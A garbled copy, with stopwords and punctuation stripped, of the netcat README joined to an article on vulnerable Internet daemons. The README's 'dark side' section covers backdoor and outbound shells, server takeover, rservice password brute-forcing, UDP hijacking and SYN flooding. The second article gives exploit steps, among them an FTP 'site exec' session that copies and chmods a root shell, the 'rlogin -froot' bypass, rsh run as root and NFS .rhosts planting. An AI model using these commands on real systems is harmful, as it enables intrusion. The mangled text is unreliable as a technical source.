netcat rule net      netcat  netcat simple unix utility read writes data across network connection using tcp udp protocol designed  reliable  backend  tool used directly easily driven v program script time w featurerich network debugging exploration tool since create  almost kind connection would need several interesting builtin    capability netcat  nc  actual program named supplied  long ago another one cryptic e standard unix tool simplest usage  nc host port  creates tcp connection given port given target host standard input sent host anything come back across connection sent standard output continues indefinitely network side connection shuts note behavior different application shut everything exit endoffile standard input netcat also function server listening inbound connection arbitrary port reading writing minor limitation netcat nt really care run  client   server  mode  still shovel data back forth nt left either mode shutdown forced configurable time inactivity network side via udp netcat possibly  udp telnetlike  application always wanted testing udpmode server udp  u  implies give le reliable data transmission tcp connection system may trouble sending large amount data way still useful capability may asking  use telnet connect arbitrary port  valid question reason telnet  standard input eof  problem one must introduce calculated delay driving script allow network output finish main reason netcat stay running network side close telnet also transfer arbitrary binary data certain character interpreted telnet option thus removed data stream telnet also emits diagnostic message standard output netcat keep thing religiously separated output never modify real data transit unless really want course telnet incapable listening inbound connection using udp instead netcat nt limitation much smaller faster telnet many advantage netcat major feature outbound inbound connection tcp udp port full dns forwardreverse checking appropriate warning ability use local source port ability use locallyconfigured network source address builtin portscanning capability randomizer builtin loose sourcerouting capability read command line argument standard input slowsend mode one line every n second hex dump transmitted received data optional ability let another program service established connection optional telnetoptions responder effort made netcat  right thing  various mode believe wrong thing whatever circumstance please notify tell think behave netcat able task think minor tweak code probably fix provides basic easilymodified template writing network application certainly encourage people make custom mod send improvement make second release overall difference  relatively minor mostly portability bugfixes many people provided greatly appreciated fix comment  release continued feedback internet community always welcome netcat entirely creation although plenty code used example freely given away internet community hope useful restriction except giving credit due gpls berkeley copyright nonsense author assumes responsibility anyone us netcat make rich somehow feeling generous mail check affiliated way microsoft network get life always ski control comment question patch hobbit avianorg building compiling fairly straightforward examine makefile systype match  make  executable  nc  appear relevant systype section try  generic  create new section generich makefile support another platform please follow given format mail back diffs couple settable defines netcatc include dflags  dthis dthat   make  invocation without edit makefile see following discussion want link resolver library sunos recommended bind x may need change xlibslresolv makefile xlibs  lresolv lbsd  linux systimeh really support presetting fdsetsize harmless warning issued system may warn pointer type signal problem though exploration feature begin netcat time simple versatile like trying describe everything swiss army knife go basic also read usage example note later may give even idea sort tool good command argument given netcat asks read line standard input break argument internally useful driving netcat certain type script side effect hiding command line argument  p  display host argument name ip address n specified netcat accept numeric ip address dns lookup anything n given v turned netcat full forward reverse name address lookup host warn alltoocommon problem mismatched name dns often take little longer connection setup useful know circumstance save time want know name ip address also connect netcat tell saving manual step looking hostname normally mismatch checking caseinsensitive per dns spec define anal compile time make casesensitive  sometimes useful uncovering minor error dns file poking around network port argument required outbound connection numeric name listed etcservices n specified numeric argument valid special syntax andor one port argument cause different behavior  see detail portscanning v switch control verbosity level message sent standard error probably want run netcat time v turned see info connection trying make probably also want give smallish w argument limit time spent trying make connection usually alias  nc   nc v w  make function thing would otherwise use telnet timeout easily changed subsequent w argument override earlier one specifying v make diagnostic output verbose v specified netcat silently work unless error happens whereupon describes error exit nonzero status refused network connection generally considered error unless asked single tcp port refused note w also set network inactivity timeout effect standard input close nothing arrives network next second netcat try read net good measure close exit lot network service accept small amount input return large amount output gopher web server main reason netcat written  block  network staying open rather standard input handling timeout way give uniform behavior network server dont close told udp connection opened instead tcp u specified nt really  connection  per se since udp connectionless protocol although netcat internally use  connected udp socket  mechanism kernel support although netcat claim outgoing udp connection  open  immediately data sent something read standard input thereafter possible determine whether really udp server end often ca nt tell udp protocol use timeouts retries thing many case wo nt bother answering specify timeout hope best get udp connection standard input fed source data look like various kind server request obtain hex dump file data sent either way use  logfile  dump line begin     respectively indicate  net   net  contain total count per direction hex ascii representation traffic capturing hex dump naturally slows netcat bit nt use speed critical netcat bind local port subject privilege restriction port already use also possible use specific local network source address network interface machine note work correctly platform use  p portarg  grab specific local port  ipaddr   name  source ip address often referred  anchoring socket  root user grab unused source port including  reserved  one le absence p bind whatever unused port system give like normal client connection unless use r see listen mode cause netcat wait inbound connection data transfer happens thus  nc l p filename  someone else connects port file sent whether wanted listen mode generally used along local port argument  required udp mode tcp mode system assign one tell v turned specify target host optional port listen mode netcat accept inbound connection host specify one foreign source port verbose mode informed inbound connection including address port came since listening   applies several possibility address came end system support ip socket option netcat attempt retrieve option inbound connection print hex netcat compiled dgapingsecurityhole e argument specifies program exec making receiving successful connection listening mode work similarly  inetd  single instance use great care piece code normally enabled know fun hack also work udp mode note supply e name program argument want launch something argument list write twoline wrapper script use inetd like always netcat compiled dtelnet argument enables respond telnet option negotiation always negative ie dont wont allows connect telnetd get past initial negotiation far enough get login prompt server since feature potential modify data stream enabled default understand might need turn define data network connection always delivered standard output efficiently possible using large k read writes standard input normally sent net way switch specifies  interval time  slows considerably standard input still read large batch netcat try find line break exist sends one line every interval time note standard input terminal data already read line line unless make interval rather long type go fairly normal rate really designed use want  measure  read file pipe portscanning popular method exploring netcat accepts command option first target host everything thereafter interpreted port name number range port mn syntax caveat port name etcservices contain hyphen  netcat currently correctly parse specify range using number one port thus specified netcat connects sending batch data standard input k worth one successfully connected specifying multiple port also suppresses diagnostic message refused connection unless v specified twice  verbosity  way normally get notified genuinely open connection example  nc v w z target   try connecting every port inclusive target likely inform ftp server telnet server mailer along way z switch prevents sending data tcp connection limited probe data udp connection thus useful fast scanning mode see port target listening limit scanning speed desired insert delay port probe pitfall regard udp scanning described later general work well range port specified scanning normally done downward within range r switch used scanning hop randomly around within range report open port find want listed order regardless pipe standard error  sort   addition random mode effect local source port also randomized prevents netcat exhibiting kind regular pattern scanning exert fairly fine control scan judicious use r selected port range cover use r single connection source port random value rather next one kernel would assigned note selecting specific local port p override localport randomization many people interested testing network connectivity using ip source routing even make sure firewall blocking sourcerouted packet system support g switch used multiple time construct loosesourcerouted path connection g argument position  hop pointer  within list network allows sourcerouted traffic test connectivity service via remote point internet note although newer bsdflavor telnets also sourcerouting capability isnt clearly documented command syntax somewhat clumsy netcats handling  g  modeled  traceroute  netcat try best behave like  cat  currently nothing terminal input mode endofline conversion standard input terminal read line line normal editing character effect freely suspend interactive connection resume c whatever interrupt character make netcat close network connection exit switch place terminal raw mode considered far necessary send raw binary data reading file piping another program meaningful effort would spent writing appropriate frontend driver netcat  arbitrary packet generator  ability talk raw socket andor nitbpfdlpi may appear point thing clearly useful refer darren reed excellent ipfilter package includes tool construct send raw packet content want example us  light side partial list possibility may get think application netcat driving netcat simple shell expect script easy flexible way fairly complex task especially coding network tool c coding nt particularly strong either although undoubtedly better writing thing tend construct baremetal tool like trivially plug application netcat double teaching tool  one learn great deal complex network protocol trying simulate raw connection example netcat backend something else shellscript web browser simply asks relevant part url pipe  get whatever  netcat connection server used telnet use calculated sleep time stupidity kludge around telnet limitation netcat guarantee get whole page since transfer data unmodified even pull binary image file display elsewhere later folk may find idea shellscript web browser silly strange start get info hell lot faster gui browser nt hide content link form included scriptsweb along several webrelated example netcat obvious replacement telnet tool talking daemon example easier type  nc host  talk someone mailer c type c quit telnet would require quickly catalog service network telling netcat connect wellknown service collect greeting least scan open port youll probably want collect netcat diagnostic message output file sure include standard error output using file csh file bourne shell scanning example  echo quit nc v w target     inform target various wellknown tcp server including rservices x irc maybe didnt expect sending quit using timeout almost guarantee see kind greeting error service usually indicates version beware  chargen  port though  satan us exactly technique collect host information indeed idea herein taken satan backend tool script try every host subnet space let run see service find host nt correctly listed dns compare new snapshot old snapshot see change going particular service intrusive example scriptsprobe netcat used simple data transfer agent doesnt really matter end listener end client  input one side arrives side output helpful start listener receiving side timeout specified give sending side small timeout way listener stay listening contact data stop flowing client time shut take listener unless intervening network fraught problem completely reliable always increase timeout typical example something  rsh  often used one side nc l p uncompress c tar xvfp side tar cfp somedir compress c nc w othermachine transfer content directory one machine another without worry rhosts file user account inetd configuration either end matter listener receiver  tarring  machine could easily running listener instead one could conceivably use scheme like backup cronjobs fire listener backup handler restricted specific address port pipe  dump   tar  one machine  dd ofdevtapedrive  another usual since netcat return nonzero exit status denied listener connection script handle task could easily log reject connect attempt third party retry another simple datatransfer example shipping thing pc nt network application yet except tcp stack web browser point browser arbitrary port unix server telling download something like http unixboxfoo listener unix side ready ship file connect come browser may pervert binary data told save url dig raw data ondisk cache build netcat gapingsecurityhole defined use  inetd  substitute test experimental network server would otherwise run  inetd  script program input output hooked network way perhaps sans fancier signal handling given network service bind particular local address whether  inetd  possible netcat avoid  address already use  error binding specific address let root low port place netcat  way  standard service since inbound connection generally sent specificallybound listener first fall back one bound   allows oneoff experimental simulation service without screw around inetdconf running v turned collecting connection log standard error recommended netcat well make outbound connection run program script originating end input output connected network port  inverse inetd  capability could enhance backupserver concept described help facilitate thing  network dialback  concept possibility many varied thing intended security mechanism may best modify netcat specifically purpose instead wrapping function script speaking inetd netcat function perfectly well inetd tcp connection redirector inbound service like  pluggw  without authentication step useful stuff like redirecting traffic firewall place like web server mail hub posing risk firewall machine put netcat behind inetd tcpwrappers perhaps thusly www stream tcp nowait nobody etctcpd binnc w realwww simple effective  application relay  access control logging note use wait time  safety  case realwww nt reachable calling user abort connection  otherwise relay may hang forever use netcat generate huge amount useless network data various performance testing example yes aaaaaaaaaaaaaaaaaaaaaa nc v v l p devnull one side hitting yes bbbbbbbbbbbbbbbbbbbbbb nc othermachine devnull another host saturate wire b  verbose  switch usage tell many sent received interrupt either side using udp mode produce tremendously trash per unit time form fragmented kbyte mobygrams  enough stresstest kernel network interface firing random binary data various network server may help expose bug input handling nowadays popular thing explore simple example datagenerator given datadatac included package along small collection canned input file generate various packet content program documented beginning comment interest using  r  generate random byte wellchosen point data stream crash daemon likely security problem hex dump feature may useful debugging odd network protocol especially nt network monitoring equipment handy nt root need run  tcpdump  something bind listening netcat local port run script turn run another netcat real service capture hex dump log file set transparent relay local port wherever real service sure scriptrun netcat use v extra info sends standard error may confuse protocol note also  listenexec  netcat data capture since connection arrives longer netcat running binding arbitrary local port allows simulate thing like rservice client root locally example feeding  root joe pwd  null rootjoe could localremote username pair  rsh   rlogin  server port example duplicate server expects receive thus test insecure rhosts file around network without create new user account client machine program datarservicec aid process constructing  rcmd  protocol byte also prevents  rshd  trying create separate standarderror socket still give input path opposed usual action  rsh n  using netcat thing like really useful sometimes rsh rlogin generally want host name argument wo nt accept ip address clientend dns hosed may true trying extract backup set dumb client  netcat n  win normal rshrlogin useless unsure remote syslogger working test netcat make udp connection port type  message  correspond  kernemerg  cause syslogd scream every file open possibly user terminal tame using different number use netcat inside routine script send syslog message place arent configured syslogconf example  echo message nc w u loggerhost  send authnotice loggerhost exact number may vary check syslogh first netcat provides several way test packet filter bind port normally protected outside access make connection somewhere outside network return traffic coming chosen port  outside  blocked tcp may get filter pass  ack syn  nt even low port network remember test udp traffic well filter pass least outbound sourcerouted ip packet bouncing connection back via gateway outside network create  incoming  traffic source address get dropped correctly configured antispoofing filter  nontest  also dropping sourcerouting good able test packet filter worth salt blocking sourcerouted packet direction never know interesting quirk might turn playing around source port address watching wire network monitor use netcat protect workstation x server outside access x stupid enough listen connection   never tell new connection arrive one reason vulnerable various x window running use netcat bind ethernet address listen port new connection outside machine hit netcat instead x server get log trying either tell netcat drop connection perhaps run another copy relay actual x server  localhost  may work dedicated x terminal may possible authorize x terminal boot server run relay netcat server turn talk x terminal since netcat handle one listening connection per run make sure whatever way rig cause another one run listen soon afterward real x server reachable minimal script protect could true nc v l p localhost done cause netcat accept close inbound connection workstation normal ethernet address another copy immediately run script send standard error file log connection attempt system ca nt  specific bind  thing lost run x server display    port netcat still function probe alarm listening shellaccount provider allow personal web page cgi script netcat listen particular port execute program script choosing point port url homepage listener could even exist completely different machine avoiding potential ire homepagehost administrator since script get raw browser query input wo nt look like typical cgi script since running uid need write carefully may want write netcatbased script wrapper read query set environment variable regular cgi script possibility using netcat script handle web stuff almost endless see example script example us  dark side equal time deserved since versatile tool like useful shade hat could use victorinox either fix car disassemble right clearly use something like netcat attack defend  nt try govern anyone social outlook build tool regardless intention still aware threat system first obvious thing scanning someone el network vulnerable service file containing preconstructed data exploratory exploitive fed standard input including commandline argument netcat keep  p  ignorant doings random scanning le likelihood detection human scandetectors dynamic filtering youll wait longer avoid loading target network example crafting various standard udp probe given datad configuration packet filter attempt solve ftpdata problem allowing connection outside come port high tcp port inside  locally bind port may find able bypass filtering case maybe low port  inside  perhaps tcp nfs server x server prospero cisco listen x x  similar bypassing may possible udp maybe tcp connection come port filter may assume nameserver response using e conjunction binding specific address enable  server takeover  getting ahead real one whereupon snarf data sent feed back least log hex dump someone else session root certainly use e run various hacked daemon without touch inetdconf real daemon may always root access deal low port machine also happens nfs server might able collect interesting thing port including local file handle several server run high port likely candidate takeover including many rpc service platform yppasswdd anyone kerberos ticket x cooky irc traffic also come mind radiusbased terminal server connect incoming user shellaccount machine high port usually thereabouts sock server run  netstat  get creative daemon wellwritten enough bind separately local interface possibly eye toward heading sort problem named recent bind release ntp two come mind netstat show listening address instead  wo nt able get front real interface address course especially interesting case named server sometimes forget thing like  alias  interface address interface appear later dynamic ppp link hacked web server version  inetd  floating around specifically bind well based configuration file  generally bound alias address offer several different addressbased service one machine using e start remote backdoor shell another obvious sort thing easier constructing file inetd listen  ingreslock  something accesscontrol people specifying client host port experience truly demonstrates fragile barrier  logged  really expressed scriptsbsh youre already behind firewall may easier make outbound connection run shell small wrapper script periodically try connecting known place port later listen inbound connection arrives shell running shell via udp several interesting feature although aware  connected  udp stub socket tend show  netstat  like tcp connection may quite subtle wanted packet may also lost use tcp need reliable connection since udp connectionless hookup sort stick around almost forever even c netcat reboot side need remember port used end reestablish outbound udpplusexec connection creates connected socket start program immediately listening udp connection socket created first packet received either case though  connection  interesting side effect clientside ip address chosen source port thereafter able talk instant access control nonlocal third party would following take session forge udp source address trivial see guess port number end sniff wire arrange block icmp udp return traffic real source session nt die network write error companion program datarservicec helpful scripting sort rservice username password guessing attack argument  rservice  simply string get nullterminated passed  rcmd  style connection assumption client need separate standarderror port bruteforce password banging best done via  rexec  available since le likely log failed attempt thus  rservice joe joespass pwd nc target exec  return joe home dir password right  permission denied  plug dictionary go town attacking rshrlogin remember root bind port end pipe  rservice joe joe pwd  netcat prevent inadvertently sending extra information telnet connection use  nc  place telnet daemon try ask thing like user term environment variable get useful answer otherwise would recent telnet program telnetds actually try collect stuff plug user variable  login  caller asked password mechanism could cause login attempt real username logged use bormanbased telnet instead  nc  got unused network interface configured kernel eg slip support alias address ifconfig one address like bind enable sort shenanigan bogus source address interface probably work slip version need farend address true hammering udp service nobrainer unfiltered syslog daemon fairly obvious trimming conf file help protect many router still blindly believe receive via rip routing protocol although udp echo chargen server check incoming packet sent another  internal  udp server many still two many matter could keep entertained hour expense bandwidth always make someone wonder probed nsagov tcp spoofing possibility mostly limited destination sourceroute locally bound phony address many site block sourcerouted packet day precisely reason kernel oddball thing sending sourcerouted packet try moving pointer around g may also fiddle routing machine start receiving packet back warning machine still send traffic using source address outbound interface regardless binding especially case localhost check first open connection get data back target host probably killing ip option end option inside tcp wrapper several package happens way handshake completed send data observe  sendq  side  netstat  connection increasing never getting sent another symptom beware sendmail x detects sourcerouted smtp connection extract hop list stick received header syn bombing sometimes called  hosing  disable many tcp server hit one often enough keep unreachable day true many denialofservice attack currently defense except maybe human level making kernel somaxconn considerably larger default halfopen timeout smaller help indeed people running large highperformance web server handle normal traffic taking mailer web server sociopathic hand sometimes useful able say disable site identd daemon minute someone realizes going backtracing still difficult since packet phony source address call enough isp noc might eventually pinpoint source also trivial clueful isp watch even block outgoing packet obviously fake source address know many clueful willing get involved hassle besides outbound packet otherwise unreachable source address one net block would look fairly legitimate note discussion various caveat subtlety design innards version  construct single file containing command argument data transfer netcat smart enough pick first line build argument list send remaining data across net one multiple port first release netcat trouble  called fgets command line argument behind scene large read standard input perhaps byte feed fgets library routine time netcat  started directly read ing stdin data byte gone us raw read everywhere right thing whether reading file pipe ttys use multipleport connection single block data maximum k minus first line improvement made logic sending saved chunk new port note commandline argument hidden using mechanism could still extracted core dump netcat receives inbound udp connection creates  connected socket  back source connection also send data using normal write using mechanism instead recvfromsendto several advantage  readwrite select loop simplified icmp error effect received nonroot user however subtle side effect udp packet arrive caller different source port listener receive udp listen mode multihomed machine may similar quirk unless specifically bind one address clear kernel support udp connected socket andor understanding entirely complete experiment  aware subtlety concerning udp scanning z netcat attempt send single null byte target port twice small time either use w timeout netcat try make  sideline  tcp connection target introduce small time delay equal roundtrip time target note w timeout timeout set take effect wait twice long tcp connection normally refused port minimize traffic notice udp fastscan taking somewhat longer could target actually listening tcp port either way icmp portunreachable message target arrived meantime second singlebyte udp probe sent bsd kernel icmp error delivered  connected socket  second write return error tell netcat udp service linux seems fortunate exception many sysv derived kernel icmp delivered netcat start reporting port  open   clearly wrong system may even  udp connected socket  concept netcat current form work udp z specified one udp port probed netcat exit status reflects whether connection  open   refused  tcp may also udp packet blocked filter icmp error return case everything time return  open  sound backwards udp work youre sure try  echo wgumz nc u w target  see reach udp echo port trouble using bsdflavor system scan udp around network although flooding target high activity z generates cause occasionally drop packet indicate false  open   correct  way collect analyze icmp error satan  udpscan  backend guarantee icmp get back either udpscan also zerobyte probe excruciatingly careful calculate roundtrip timing average dynamically set response timeouts along decoding icmp received netcat us much sleazier method nonetheless quite effective cisco router known  dead time  icmp response unreachable udp port fast scan cisco show almost everything  open  looking specific udp service construct file containing right byte trigger response end send standard input netcat read k file send data every udp port given note must use timeout case would udp client application since twowrite probe happens z specified many telnet server insist specific set option negotiation presenting login banner raw connection see small amount binary gook attempt create fixed input byte make telnetd happy worked place failed newer bsdflavor one possibly due timing problem couple much better workarounds first compile dtelnet use want get past option negotiation talk something telnet port still see binary gook  fact see lot option responded behind scene telnet responder update total byte count show hex dump  responds negatively option read incoming data stream want use normal fullblown telnet get something also want netcat feature involved like settable port timeouts construct tiny  foo  script binsh exec nc otheroptions targethost nc l p someport e foo localhost telnet localhost someport telnet connect transparently execed netcat target using whatever option supplied  foo  script nt use inside script wind sending two option response observed inconsistent behavior linux perhaps older one binding listen mode sometimes netcat bind  localhost  invoked address port argument sometimes unable bind specific address listening something else already listening   former problem worked around specifying    right thing despite netcat claiming listening  known problem  example mention makefile sock flip side binding localhost sending packet machine nt work expect  go source address sending interface instead linux kernel contains specific check ensure packet  never sent wire kernel may contain similar code linux course still nt support sourcerouting claim many network improvement least breathing hard several possible error associated making tcp connection specifically see anything  refused  one must wait full kerneldefined timeout connection fail netcat mechanism wrapping alarm timer around connect prevents real network error returned   errno  point indicates  interrupted system call  since connect attempt interrupted old  bsd kernel would actually return thing like  host unreachable  immediately case newer kernel seem wait full timeout pas back real error go figure case argue old way better despite kernel generally one tear established tcp connection icmpbombed incoming socket option passed application kernel kernel internal format socketoptions structure sourcerouting contains  firsthop  ip address first followed rest real option list kernel us sending reply packet  structure therefore designed useful kernel human hex dump netcat produce still useful kernel treat sourcerouting option somewhat oddly sort make sense one understands going internally option list address must contain hop hop  destination sourcerouted packet sent kernel least bsd actual destination address becomes irrelevant replaced  hop   hop  removed option list address list shifted fill hole thus outbound packet sent chosen source address first gateway option list contains hop  destination address shuffling kernel change pointer value useful able set pointer  construct really bizarre return path send traffic fairly directly target around larger loop way back sun kernel seem never flip sourceroute around contains le three hop never reset pointer anyway try send packet option containing  completed  source route directly back source way broken course maybe ipforwarding nt opportunity beat thoroughly yet  credit  section original idea netcat fell longstanding desire fruitless search tool resembling feature reading network code realizing many cool thing socket could controlled calling user started basic rest fell together pretty quickly portscanning idea taken venemafarmer satan tool kit pluvius  pscan  utility healthy amount bsd kernel source perused attempt dope socket option sourceroute handling additional help obtained dave borman telnet source select loop loosely based fairly wellknown code  rsh  richard stevens  sock  program sort  netcat  obscure feature paranoid sanitychecking thrown guard distinct likelihood subtlety thing still nt understand found argumenthiding method cleanly implemented barrett  deslogin  reading line input allows greater versatility much le prone cause bizarre problem common trick overwriting argv array first release several people contributed portability fix credited generich makefile lauren burka inspired ascii art revised document dean gaudet wired supplied precursor hexdump code mudge lphtcom originally experimented supplied code telnetoptions responder outbound  e  resulted need quietly bypass firewall installation suggestion patch rolled always grateful hour per day discussion feature creep near end document netcat written russian railroad mind  conservatively built solid get coding style fairly  tight  attempted present cleanly keeping line character dammit put plenty comment certain thing done item know questionable clearly marked  xxx  source code made modified determining start difficult tangle spaghetti code major point feel worth mentioning netcat internal design whether agree approach except generich change adapt platform netcat single source file distinct advantage include header redeclare function billion different place attempted contain gross whosgotwhathfile thing one small dumping ground function placed  dependenciesfirst  compiler run call later already know type argument wo nt complain function prototyping  even p crock  used since portable file size easy enough check manually function standardformat comment ahead easily found using regexp   freely use gotos loop ifclauses made small nonnested possible end marked clarity wish everyone would large structure buffer malloc ed fly slightly larger size asked zeroed reduces chance damage  end buffer  fencepost error runaway pointer escaping end thing permanent per run nothing need freed program exit file descriptor zero always expected standard input even closed new network descriptor wind zero different one asked nonzero fd zero simply left kicking around rest run everything else assumes stdin always zero  netfd  always positive may seem silly lot easier code new fd obtained directly new socket trying simply dup new fd broke subsequent socketstyle use new fd solaris stupid stream handling socket library catchall message error handler implemented ample list phoney argument get around various problem varargs varargs seems like deliberate obfuscation first place using would also require use vfprintf platform support trailing sleep bail allow output flush sometimes needed netcat already end network connection reader may notice section dns lookup seems much gnarlier confusing part fault sockaddr hostent abstraction abortion force coder deal lot bsd kernel code look like similar structpointer hell try straighten somewhat defining hinf structure containing name asciiformat ip address binary ip address fill structure exactly per host argument squirrel everything safely away handy whatever want reference later many network apps use fionbio ioctl set nonblocking io network socket netcat us straightforward blocking io everywhere make everything lockstep relying network filesystem layer feed data needed data read completely written fetched may quite right thing os nt timed select right remains seen hexdump routine written fast possible much work instead sprintf ing everything together dump line built single buffer atomically written using lowest level io call improvement could undoubtedly made using writev eliminating sprintf seems fly right along execaprog mode hexdump file asked hexdump flag deliberately turned avoid creating random zerolength file file opened  truncate  mode want  append  mode instead change open flag main main may look bit hairy go argv list handle multiple port random mode exit status effort made place minimum code inside getopt loop real work sent function hopefully straightforward way obligatory vendorbash  nc  become standard utility year ago commercial vendor would likely packaged setuid root dgapingsecurityhole turned documented hoped netcat aid people finding fixing nobrainer hole sort keep appearing allowing easier experimentation  bare metal  network layer could argued netcat already many feature tried avoid  feature creep  limiting netcat base functionality thing truly relevant making network connection everyday associated dns lossage used option switch already slightly overloaded functionality random port mode sort pushing hexdump feature went later genuinely useful telnetresponder code almost verge gratuitous especially since muck data stream left optional piece many people asked example  bout adding encryption  response thing separate entity could pipe data netcat instead networking code therefore completely enthusiastic adding feature thing although still free send along mod think useful nonetheless point think netcat tcpip swiss army knife numerous companion program script go duct tape duct tape course light side dark side bind universe together wrap enough around trying accomplish work alternatively netcat large hammer many network protocol increasingly looking like nail  h v release  happy spring netcat rule net      internet daemon author voyager tno date june internet host communicate using either tcp transmission control protocol udp user datagram protocol top ip internet protocol protocol used top ip tcp udp one interest u unix system file etcprotocols list available protocol machine session layer osi model internet layer dod protocol model data moved host using port data communication source port number destination port number port number divided two type wellknown port dynamically allocated port unix wellknown port defined file etcservices addition rfc request comment  assigned number  provides complete listing wellknown port dynamically allocated port number assigned needed system unix provides ability connect program called daemon wellknown port remote computer connect wellknown port host computer connected daemon program daemon program traditionally started inetd internet daemon daemon program executed defined inetd configuration file etcinetdconf daemon run priveledged user often root many program vulnerability exploited gain access remote system daemon interested service port number description    ftp file transfer control smtp simple mail transfer protocol tftp trivial file transfer protocol finger finger wwwhttp world wide web http sunrpc sun remote procedure call flnspx berkeley rlogind spx auth rshspx berkeley rshd spx auth netinfo  netinfo ibmres ibm remote execution starter nfs network file system x  x window system rcprshd remote copyremote shell daemon ni network information service next part article focus specific daemon known vulnerability vulnerability brief explanation explained complicated exploit beyond scope concise article research required part reader ftp file transfer control ftp file transfer protocol ftp request answered ftp daemon ftpd wuarchive ftpd version  vulnerability execute binary see site exec command calling relative pathname    beginning sample exploit login system via ftp uswestcom ftp server version wu ready name uswestcom waltman waltman password required waltman password jim user waltman logged remote system type unix using binary mode transfer file ftp quote  site exec cp binsh tmptno  cp binsh tmptno ftp quote  site exec chmod tmptno  chmod tmptno ftp quit goodbye smtp simple mail transfer protocol mail attack one oldest known method attacking internet host common mail daemon least secure sendmail mail daemon include smail mmdf ida sendmail sendmail many vulnerability list entire faq written specifically sendmail vulnerability therefore cover heavily one well known vulnerability useful historical purpose  wizard mode  wizard mode could request shell via port smtp port modern system vulnerable attack exploit vulnerability telnetted port typed wiz enter wizard mode entered password problem related way encrypted password stored bug caused system believe password good real password quote steven bellovin intended behavior wizard mode supplied right password nonstandard smtp command enabled notably one give shell hashed password  oneway encrypted exactly per etcpasswd  stored sendmail configuration file bug explain need discus arcanum relating sendmail c compiler order save expense reading parsing configuration file time sendmail known  frozen configuration file  concept fine implementation nt freeze configuration file sendmail wrote disk entire dynamic memory area used malloc bs area  area took space executable file initialized zero unix kernel program executed bs area held variable given explicit initial value c source naturally delivering mail sendmail read whole chunk back two giant read therefore necessary store configuration file information bs malloc area demanded fair amount care coding wizard mode password stored malloced memory frozen properly pointer explicitly set null source char wiz null meant initialized data area bs therefore saved frozen configuration  configuration file parsed frozen password read written next time sendmail run though pointer reset null password present course way find code stupidly believed concept password back door one point worth noting  testing sendmail right thing wizard mode check password  nt happen wizard mode test frozen configuration file  testing would done way since refreeze compilation  pointer would correct tftp trivial file transfer protocol tftp trivial file transfer protocol tftp often used attempt grab password file remote system tftp attack simple repetitive script written automate process attacking entire domain one script already published first book matic finger finger finger command display information another user login name full name terminal name idle time login time location known finger request answered fingerd daemon robert tappan morris internet worm used finger daemon finger daemon allowed byte remote machine part finger request fingerd however suffered buffer overflow bug caused lack proper bound checking anything got interpreted machine fingered instruction executed locally whatever privilege finger daemon wwwhttp world wide web http html hypertext markup language allows web page user execute program host system web page designer allows web page user enter argument command system vulnerable usual problem associated system type call addition vulnerability circumstance give xterm using uid www server running sunrpc sun remote procedure call sun rpc remote procedure call allows user execute procedure remote host rpc suffered lack secure authentification exploit rpc vulnerability program called  ont  terribly difficult find login remote login version aix linux suffer bug way rlogind read argument exploit vulnerability issue command remote system rlogin host l froot host name target machine username username would like rlogin usully root bug exists host system logged without asked password rshspx berkeley rshd spx auth version dynix irix bug rshd allows run command root exploit vulnerability issue command remote system rsh host l   binsh netinfo  netinfo next implemented protocol known netinfo one next machine query another next machine information netinfo server default allow unrestricted access system database fixed system administrator one piece information netinfo give password file ibmres ibm remote execution starter rexd remote execution daemon allows execute program another unix machine aix next hpux version rexd suffered vulnerability allowing unintended remote execution rexd daemon check uid machine coming therefore must root machine mounting rexd attack determine target machine running rexd use rcp p command also need exploit program known available fine hp board everywhere nfs network file system nfs network file system sun microsystems suffered multiple security vulnerability addition many system administrator configure nfs incorrectly allowing unintended remote access using command showmount e view file system exported machine many administrator allow read access etc directory allowing copy password file administrator allow write access user directory allowing create rhosts file gain access machine via rlogin rsh addition configuration issue nfs vulnerable attack using uid masking bug mknod bug general file handle guessing attack several hacked version mount command written exploit known vulnerability x  x window system xwindows suffered currently suffers numerous vulnerability one vulnerability allows access another user display another allows view another user keystroke another vulnerability allows remote attacker run every program root user start xsession file yet another xwindows vulnerability allows local user create root entry etcpasswd file rcp sunos x rcp utility exploited trusted host listed etchostsequiv rhosts exploit hole must running nfs network file system unix system pcnfs do system ni sun ni network information service also known yp yellow page vulnerability request ni map another ni domain know ni domain name target system way query remote system ni domainname many ni domain name easily guessable popular ni map request passwdbyname ni implementation etcpasswd addition access diskless unix workstation determine ni domain name server boot                             confuse ni domain name dns domain name                             attack addition daemon based attack many method used gain access remote computer include limited default account password guessing sniffing source routing dns routing attack tcp sequence prediction uucp configuration exploit give idea daemon based attack function mean complete list security vulnerability privileged internet daemon discover information daemon operate exploit vulnerability highly recommend reading source code man page rfc 